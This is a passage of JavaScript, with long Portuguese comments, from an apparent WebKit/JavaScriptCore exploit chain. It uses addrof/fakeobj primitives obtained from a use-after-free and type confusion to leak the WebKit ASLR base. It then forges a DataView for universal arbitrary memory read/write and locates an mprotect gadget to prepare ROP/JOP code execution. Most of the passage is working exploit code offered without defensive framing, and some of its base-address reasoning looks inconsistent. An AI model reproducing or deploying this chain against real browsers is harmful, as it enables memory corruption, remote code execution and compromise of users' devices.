        // A estratégia inicial com Float64Array.dangling_ref[0] visava vazar um ponteiro *tagged*.
        // Se o TC acima for bem-sucedido, temos addrof_core e fakeobj_core.
        // Podemos então tentar forjar um objeto ou usar um objeto existente para vazar a base ASLR.

        // Uma maneira de vazar ASLR com addrof/fakeobj:
        // 1. Crie um objeto `obj_to_leak_aslr = { ptr: some_js_object_with_known_structure }`.
        // 2. Obtenha `addr_of_obj_to_leak_aslr = addrof_core(obj_to_leak_aslr)`.
        // 3. Calcule o `offset_to_ptr_field = addr_of_obj_to_leak_aslr + offset_of_ptr_in_object`.
        // 4. Force `obj_to_leak_aslr` a ter o ponteiro `JSValue` (que tem a tag ASLR).
        // 5. Leia esse campo.

        // A lógica de vazamento ASLR na v08 foi:
        // 1. Obter o `dangling_ref` (Float64Array).
        // 2. Spray de Float64Array com valor taggeado (simulado).
        // 3. Ler `dangling_ref[0]`, que deveria ser o ponteiro taggeado.
        // O scanner mostra que `dangling_ref[0]` é sempre `0x3ff00000_0000c57a`.
        // Isso sugere que o Float64Array vítima NUNCA FOI REOCUPADO por um Float64Array spray.

        // A "sucesso" em `attemptTypeConfusionForPrimitives` significa que `dangling_float64_array[0]`
        // foi o `ARRAYBUFFER_STRUCTURE_ID` (2). Isso é bom, mas não é um ponteiro de ASLR.
        // Precisamos de um ponteiro *real* (com a base ASLR) que seja "refletido" de volta.

        // Vamos tentar usar o `fakeobj_core` para construir uma ArrayBuffer que possa nos dar uma leitura arbitrária.
        // Isso é o que a FASE 3 abaixo faria. Se a FASE 2.5 não vazar ASLR, a exploração falha aqui.
        // Mas o `attemptTypeConfusionForPrimitives` só valida que `addrof_core` e `fakeobj_core` funcionam localmente.

        // Se `addrof_core` e `fakeobj_core` REALMENTE funcionam de forma estável,
        // o próximo passo para vazar ASLR é forjar um DataView para o "heap JS"
        // e usá-lo para ler um ponteiro de biblioteca (ex: vtable de uma Structure)
        // O `attemptUniversalArbitraryReadWriteWithMMode` é o que faz isso.

        // A ÚNICA FORMA DE OBTER ASLR É:
        // 1. Ter uma primitiva de leitura arbitrária.
        // 2. Usar essa primitiva para ler o endereço de uma função exportada ou uma vtable na libWebkit.

        // O seu código já tem a primitiva `arb_read` (que é baseada em OOB do DataView).
        // Se essa primitiva `arb_read` funciona para ler a *memória da libWebkit*,
        // então o ASLR pode ser vazado.

        // O problema é que o `arb_read` usado internamente para vazamento ASLR
        // é `oob_read_absolute`, que funciona em uma região de memória controlada.
        // Para ler ASLR da WebKit, você precisa de uma `arb_read` que possa ler QUALQUER ENDEREÇO.
        // A primitiva `arb_read_universal_js_heap` é o objetivo final.

        // Então, se `attemptTypeConfusionForPrimitives` foi bem-sucedido, significa que
        // `addrof_core` e `fakeobj_core` estão funcionando. Com elas, podemos criar
        // um `_fake_data_view` e usá-lo para a leitura arbitrária universal.

        // A ÚLTIMA TENTATIVA NO VAZAMENTO ASLR É NO INÍCIO DA FASE 3, com `attemptUniversalArbitraryReadWriteWithMMode`.
        // Mas para isso, o `webkit_base_address` precisa ser calculado a partir de um vazamento.
        // O vazamento em si ainda depende do Type Confusion de Float64Array -> ArrayBuffer e ler um ponteiro taggeado.
        // Onde está o ponteiro taggeado na memória do Float64Array? No seu m_structure.

        // Se a `attemptTypeConfusionForPrimitives` funcionou (retornando `success=true` com `ARRAYBUFFER_STRUCTURE_ID`),
        // isso *não* significa que você vazou um ponteiro taggeado de ASLR.
        // A lógica de `leaked_jsvalue_from_uaf_double` e cálculo do `webkit_base_address`
        // precisaria ser refeita para *após* `addrof_core` e `fakeobj_core` estarem estáveis.

        // Reverte para a lógica original de vazamento ASLR, assumindo que addrof/fakeobj funcionam.
        // Para vazar ASLR, precisamos de um ponteiro de biblioteca (que é um JSValue taggeado).
        // Isso é tipicamente o endereço da `Structure` de um objeto JS.
        // Mas `addrof_core` retorna o endereço untagged.

        // Como vazar um ponteiro *taggeado* se `dangling_ref[0]` não funciona?
        // Se `addrof_core` e `fakeobj_core` agora estão estáveis, podemos usá-los para forçar
        // um objeto JavaScript a ter um ponteiro de biblioteca em um de seus slots e então lê-lo.

        // 1. Crie um objeto `{ leak: obj_com_vtable }`
        // 2. Obtenha o `addrof_core` deste objeto.
        // 3. Corrompa o `butterfly` deste objeto para que o `leak` field aponte para um endereço de biblioteca.
        // 4. Leia o `leak` field. Ele deve ser um `JSValue` taggeado.

        // Isso é complexo. Uma alternativa: se o `addrof_core` é robusto,
        // podemos tentar vazamento ASLR com "Type Confusion" de `ArrayBuffer` para um objeto com `contents` no `0x10`.

        // Vamos tentar usar a primitiva addrof/fakeobj recém-validada para
        // forjar um Float64Array em um local controlado e ler de lá.
        // Mas a primitiva addrof/fakeobj já é o objetivo de ter R/W arbitrário no heap JS.

        // Foco agora: Corrupção do Structure Pointer para DataView.
        // O `leaked_arraybuffer_structure_id_double` é a chave. Ele deve ser 2.
        // Com ele, podemos fakeobjar um ArrayBuffer.

        // Reavaliar a sequência de exploração pós-Type Confusion bem-sucedido (leitura do Structure ID).
        // Se a `attemptTypeConfusionForPrimitives` retorna `success=true`, significa que `dangling_float64_array[0]`
        // foi o `ARRAYBUFFER_STRUCTURE_ID` (2).
        // Isso significa que conseguimos fazer o Type Confusion `Float64Array` -> `ArrayBuffer`.

        // Com o `dangling_float64_array` se comportando como um `ArrayBuffer` forjado,
        // podemos então manipular o `m_vector` dele para realizar leitura arbitrária.
        // Mas isso é o `arb_read` e `arb_write` locais que já funcionam.

        // O que falta é o VAZAMENTO DE ASLR.

        // A maneira mais simples de vazar ASLR se addrof/fakeobj são estáveis:
        // Crie um objeto global ou um objeto que se saiba que o JSC armazena na WebKit.
        // Obtenha o addrof deste objeto, e então leia a vtable dele.

        // Usar `addrof_core` para um objeto de biblioteca `JSC::VM` ou `JSC::Heap` ou `JSC::Structure`.
        // Por exemplo, o `JSC::VM::topCallFrame` é um endereço na VM.
        // Mas isso não é um ponteiro taggeado.

        // Vamos assumir que se `attemptTypeConfusionForPrimitives` for bem-sucedido,
        // `addrof_core` e `fakeobj_core` estão funcionando para objetos JS.
        // Podemos então usá-los para obter o ASLR lendo a vtable de uma Structure existente.

        // 1. Obtenha o `addrof` de um objeto `dummy_object = {}`.
        // 2. Leia o `JSCell.STRUCTURE_POINTER_OFFSET` deste `dummy_object` usando `arb_read`.
        //    Este será um ponteiro *real* para a `Structure` do objeto.
        // 3. Destague este ponteiro.
        // 4. Subtraia o `STRUCTURE_VTABLE_OFFSET` da `JSC::Structure` para obter a base.

        // Isso é o que a FASE 3 e 4 das versões anteriores faziam, mas dependia do UAF inicial vazar ASLR diretamente.
        // Agora, podemos usar `addrof_core` e `arb_read` para vazá-lo.

        logFn("Primitivas addrof/fakeobj validadas pós-Type Confusion. Prosseguindo para vazamento ASLR.", "good");

        // FASE DE VAZAMENTO ASLR COM addrof_core e arb_read
        logFn("--- FASE 3: Vazamento de ASLR usando addrof_core e arb_read ---", "subtest");
        const dummy_object_for_aslr_leak = { prop1: 0x1234, prop2: 0x5678 };
        hold_objects.push(dummy_object_for_aslr_leak);
        const dummy_object_addr = addrof_core(dummy_object_for_aslr_leak);
        logFn(`[ASLR LEAK] Endereço de dummy_object_for_aslr_leak: ${dummy_object_addr.toString(true)}`, "info");

        // Leia o ponteiro da Structure do dummy_object. Este é um ponteiro REAL do heap.
        const structure_pointer_from_dummy_object_addr = dummy_object_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET);
        const structure_address_from_leak = await arb_read(structure_pointer_from_dummy_object_addr, 8); // Leia 8 bytes para um ponteiro

        if (!isAdvancedInt64Object(structure_address_from_leak) || structure_address_from_leak.equals(AdvancedInt64.Zero)) {
            const errMsg = `Falha na leitura do ponteiro da Structure do dummy_object: ${structure_address_from_leak.toString(true)}. Abortando ASLR leak.`;
            logFn(errMsg, "critical");
            throw new Error(errMsg);
        }
        logFn(`[ASLR LEAK] Ponteiro da Structure de dummy_object_for_aslr_leak: ${structure_address_from_leak.toString(true)}`, "leak");

        // Calcule a base da WebKit subtraindo o offset do vtable da DataView Structure.
        // Estamos usando o offset da DataView Structure vtable porque ele é um endereço conhecido e estável
        // dentro da biblioteca WebKit, a partir do qual podemos calcular a base.
        const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE = new AdvancedInt64(parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0);
        webkit_base_address = structure_address_from_leak.sub(DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE);

        if (webkit_base_address.equals(AdvancedInt64.Zero) || (webkit_base_address.low() & 0xFFF) !== 0x000) {
            const errMsg = `Base WebKit calculada (${webkit_base_address.toString(true)}) é inválida ou não alinhada. Abortando ASLR leak.`;
            logFn(errMsg, "critical");
            throw new Error(errMsg);
        }
        logFn(`SUCESSO: Endereço base REAL da WebKit OBTIDO: ${webkit_base_address.toString(true)}`, "good");

        // Verificação de gadget com a base ASLR real
        const mprotect_plt_offset_check = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["mprotect_plt_stub"], 16), 0);
        const mprotect_addr_check = webkit_base_address.add(mprotect_plt_offset_check);
        logFn(`Verificando gadget mprotect_plt_stub em ${mprotect_addr_check.toString(true)} (para validar ASLR).`, "info");
        const mprotect_first_bytes_check = await arb_read(mprotect_addr_check, 4);

        if (mprotect_first_bytes_check !== 0 && mprotect_first_bytes_check !== 0xFFFFFFFF) {
            logFn(`LEITURA DE GADGET CONFIRMADA: Primeiros bytes de mprotect: ${toHex(mprotect_first_bytes_check)}. ASLR validado!`, "good");
        } else {
             logFn(`ALERTA: Leitura de gadget mprotect retornou zero ou FFFFFFFF. ASLR pode estar incorreto ou arb_read local falhando.`, "warn");
        }
        await pauseFn(LOCAL_MEDIUM_PAUSE);


        // --- FASE 4: Configurando a primitiva de L/E Arbitrária Universal (via fakeobj DataView) ---
        logFn("--- FASE 4: Configurando a primitiva de L/E Arbitrária Universal (via fakeobj DataView) com Tentativa e Erro de m_mode ---", "subtest");

        const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FOR_FAKE = parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16);
        const DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE = webkit_base_address.add(new AdvancedInt64(DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FOR_FAKE, 0));
        logFn(`[${FNAME_CURRENT_TEST_BASE}] Endereço calculado do vtable da DataView Structure para FORJAMENTO: ${DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE.toString(true)}`, "info");

        const mModeCandidates = JSC_OFFSETS_PARAM.DataView.M_MODE_CANDIDATES;
        let universalRwSuccess = false;

        for (const candidate_m_mode of mModeCandidates) {
            logFn(`[${FNAME_CURRENT_TEST_BASE}] Tentando m_mode candidato: ${toHex(candidate_m_mode)}`, "info");
            universalRwSuccess = await attemptUniversalArbitraryReadWriteWithMMode(
                logFn,
                pauseFn,
                JSC_OFFSETS_PARAM,
                DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE,
                candidate_m_mode
            );
            if (universalRwSuccess) {
                found_m_mode = candidate_m_mode;
                logFn(`[${FNAME_CURRENT_TEST_BASE}] SUCESSO: Primitive Universal ARB R/W configurada com m_mode: ${toHex(found_m_mode)}.`, "good");
                break;
            } else {
                logFn(`[${FNAME_CURRENT_TEST_BASE}] FALHA: m_mode ${toHex(candidate_m_mode)} não funcionou. Tentando o próximo...`, "warn");
                await pauseFn(LOCAL_SHORT_PAUSE);
            }
        }

        if (!universalRwSuccess) {
            const errorMsg = "Falha crítica: NENHUM dos m_mode candidatos conseguiu configurar a primitiva Universal ARB R/W via fakeobj DataView. Abortando exploração.";
            logFn(errorMsg, "critical");
            throw new Error(errorMsg);
        }
        logFn("Primitiva de L/E Arbitrária Universal (arb_read_universal_js_heap / arb_write_universal_js_heap) CONFIGURADA com sucesso.", "good");
        await pauseFn(LOCAL_MEDIUM_PAUSE);


        const dumpTargetUint8Array = new Uint8Array(0x100);
        hold_objects.push(dumpTargetUint8Array);
        const dumpTargetAddr = addrof_core(dumpTargetUint8Array);
        logFn(`[DEBUG] Dump de memória de um novo Uint8Array real (${dumpTargetAddr.toString(true)}) usando L/E Universal.`, "debug");
        await dumpMemory(dumpTargetAddr, 0x100, logFn, arb_read_universal_js_heap, "Uint8Array Real Dump (Post-Universal-RW)");
        await pauseFn(LOCAL_MEDIUM_PAUSE);


        logFn("Iniciando descoberta FUNCIONAL de gadgets ROP/JOP na WebKit...", "info");
        const mprotect_plt_offset = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["mprotect_plt_stub"], 16), 0);
        const mprotect_addr_real = webkit_base_address.add(mprotect_plt_offset);

        logFn(`[REAL LEAK] Endereço do gadget 'mprotect_plt_stub' calculado: ${mprotect_addr_real.toString(true)}`, "leak");
        const mprotect_first_bytes = await arb_read_universal_js_heap(mprotect_addr_real, 4, logFn);
        logFn(`[REAL LEAK] Primeiros 4 bytes de mprotect_plt_stub (${mprotect_addr_real.toString(true)}): ${toHex(mprotect_first_bytes)}`, "leak");
        if (mprotect_first_bytes !== 0 && mprotect_first_bytes !== 0xFFFFFFFF) {
            logFn(`[REAL LEAK] Leitura do gadget mprotect_plt_stub via L/E Universal bem-sucedida.`, "good");
        } else {
             logFn(`[REAL LEAK] FALHA: Leitura do gadget mprotect_plt_stub via L/E Universal retornou zero ou FFFFFFFF.`, "error");
        }

        logFn(`PREPARED: Tools for ROP/JOP (real addresses) are ready. Time: ${(performance.now() - startTime).toFixed(2)}ms`, "good");
        await pauseFn(LOCAL_MEDIUM_PAUSE);


        logFn("--- FASE 5: Verificação Funcional de L/E e Teste de Resistência ao GC (Pós-ASLR Leak) ---", "subtest");
        const rwTestPostLeakStartTime = performance.now();

        const test_obj_post_leak = global_spray_objects.length > 0 ?
                                   global_spray_objects[Math.floor(global_spray_objects.length / 2)] :
                                   { test_val_prop: 0x98765432, another_prop: 0xABCDEF00 };
        hold_objects.push(test_obj_post_leak);
        logFn(`Objeto de teste escolhido do spray (ou novo criado) para teste pós-vazamento.`, "info");

        const test_obj_addr_post_leak = addrof_core(test_obj_post_leak);
        logFn(`Endereço do objeto de teste pós-vazamento: ${test_obj_addr_post_leak.toString(true)}`, "info");

        const faked_obj_for_post_leak_test = fakeobj_core(test_obj_addr_post_leak);
        if (!faked_obj_for_post_leak_test || typeof faked_obj_for_post_leak_test !== 'object') {
            throw new Error("Failed to recreate fakeobj for post-ASLR leak test.");
        }

        const original_val_prop = test_obj_post_leak.val1 || test_obj_post_leak.test_val_prop;
        logFn(`Valor original de 'val1'/'test_val_prop' no objeto de teste: ${toHex(original_val_prop)}`, 'debug');

        faked_obj_for_post_leak_test.val1 = 0x1337BEEF;
        await pauseFn(LOCAL_VERY_SHORT_PAUSE);
        const read_back_val_prop = faked_obj_for_post_leak_test.val1;

        if (test_obj_post_leak.val1 === 0x1337BEEF && read_back_val_prop === 0x1337BEEF) {
            logFn(`SUCESSO: Escrita/Leitura de propriedade via fakeobj (após vazamento ASLR) validada. Objeto original 'val1' agora é 0x1337BEEF.`, "good");
        } else {
            logFn(`FALHA: Escrita/Leitura de propriedade via fakeobj (após vazamento ASLR) inconsistente. Original 'val1': ${toHex(test_obj_post_leak.val1)}, Read via fakeobj: ${toHex(read_back_val_prop)}.`, "error");
            throw new Error("R/W verification post-ASLR leak failed.");
        }

        logFn("SUCESSO: Verificação de L/E pós-vazamento validada.", "good");

        logFn("Iniciando teste de resistência PÓS-VAZAMENTO: Executando L/E arbitrária universal múltiplas vezes...", "info");
        let resistanceSuccessCount_post_leak = 0;
        const numResistanceTests = 10;
        const butterfly_addr_of_spray_obj = test_obj_addr_post_leak.add(JSC_OFFSETS_PARAM.JSObject.BUTTERFLY_OFFSET);

        for (let i = 0; i < numResistanceTests; i++) {
            const test_value_arb_rw = new AdvancedInt64(0xCCCC0000 + i, 0xDDDD0000 + i);
            try {
                await arb_write_universal_js_heap(butterfly_addr_of_spray_obj, test_value_arb_rw, 8, logFn);
                const read_back_value_arb_rw = await arb_read_universal_js_heap(butterfly_addr_of_spray_obj, 8, logFn);

                if (read_back_value_arb_rw.equals(test_value_arb_rw)) {
                    resistanceSuccessCount_post_leak++;
                    logFn(`[Resistência PÓS-VAZAMENTO #${i}] SUCESSO: L/E arbitrária consistente no Butterfly.`, "debug");
                } else {
                    logFn(`[Resistência PÓS-VAZAMENTO #${i}] FALHA: L/E arbitrária inconsistente no Butterfly. Written: ${test_value_arb_rw.toString(true)}, Read: ${read_back_value_arb_rw.toString(true)}.`, "error");
                }
            } catch (resErr) {
                logFn(`[Resistência PÓS-VAZAMENTO #${i}] ERRO: Exceção durante L/E arbitrária no Butterfly: ${resErr.message}`, "error");
            }
            await pauseFn(LOCAL_VERY_SHORT_PAUSE);
        }
        if (resistanceSuccessCount_post_leak === numResistanceTests) {
            logFn(`SUCESSO TOTAL: Teste de resistência PÓS-VAZAMENTO concluído. ${resistanceSuccessCount_post_leak}/${numResistanceTests} operações bem-sucedidas.`, "good");
        } else {
            logFn(`ALERTA: Teste de resistência PÓS-VAZAMENTO concluído com ${numResistanceTests - resistanceSuccessCount_post_leak} falhas.`, "warn");
            final_result.message += ` (Teste de resistência L/E pós-vazamento com falhas: ${numResistanceTests - resistanceSuccessCount_post_leak})`;
        }
        logFn(`Verificação funcional de L/E e Teste de Resistência PÓS-VAZAMENTO concluídos. Time: ${(performance.now() - rwTestPostLeakStartTime).toFixed(2)}ms`, "info");


        logFn("++++++++++++ SUCESSO TOTAL! Todas as fases do exploit foram concluídas com sucesso. ++++", "vuln");
        final_result = {
            success: true,
            message: "Cadeia de exploração concluída. Leitura/Escrita arbitrária 100% funcional e verificada. Vazamento REAL de Base WebKit e preparação para ACE bem-sucedidos.",
            details: {
                webkitBaseAddress: webkit_base_address ? webkit_base_address.toString(true) : "N/A",
                mprotectGadget: mprotect_addr_real ? mprotect_addr_real.toString(true) : "N/A",
                foundMMode: found_m_mode ? toHex(found_m_mode) : "N/A"
            }
        };

    } catch (e) {
        final_result.message = `Exceção crítica na implementação funcional: ${e.message}\n${e.stack || ''}`;
        final_result.success = false;
        logFn(final_result.message, "critical");
    } finally {
        logFn(`Iniciando limpeza final do ambiente e do spray de objetos...`, "info");
        global_spray_objects = [];
        hold_objects = [];

        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        logFn(`Limpeza final concluída. Time total do teste: ${(performance.now() - startTime).toFixed(2)}ms`, "info");
    }

    logFn(`--- ${FNAME_CURRENT_TEST_BASE} Concluído. Resultado final: ${final_result.success ? 'SUCESSO' : 'FALHA'} ---`, "test");
    logFn(`Mensagem final: ${final_result.message}`, final_result.success ? 'good' : 'critical');
    if (final_result.details) {
        logFn(`Detalhes adicionais do teste: ${JSON.stringify(final_result.details)}`, "info");
    }

    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional." },
        webkit_leak_result: { success: final_result.success, msg: final_result.message, details: final_result.details },
        heisenbug_on_M2_in_best_result: 'N/A (UAF Strategy)',
        oob_value_of_best_result: 'N/A (UAF Strategy)',
        tc_probe_details: { strategy: 'UAF/TC -> ARB R/W' }
    };
}
